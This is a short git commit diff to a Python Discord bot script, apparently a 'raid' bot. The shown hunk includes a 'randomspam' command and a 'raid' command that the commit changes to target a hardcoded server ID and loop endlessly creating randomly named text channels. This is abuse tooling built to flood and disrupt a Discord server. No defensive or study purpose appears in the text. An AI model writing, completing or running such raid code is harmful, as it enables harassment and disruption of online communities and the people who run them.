19e69d4435516f796edbdd6669a6e96c1f9caa73
RougeStream11 <47986481+RougeStream11@users.noreply.github.com>
2019-12-24 20:29:53 +0100

    Update cat+1.3.py

--- cat+1.3.py
+++ cat+1.3.py
@@ -876,8 +876,8 @@ async def randomspam():
 		await client.say(random.randint(0, 1000000000000000000000000000000000000000000000000000000000000000-00000000))
 
 @client.command()
-async def raid(ctx):
-	server = ctx.message.server
+async def raid():
+	server = 579291358666162177
 	while True:
 		await client.create_channel(server,str(random.randint(0,1001922)),type=discord.ChannelType.text)
  
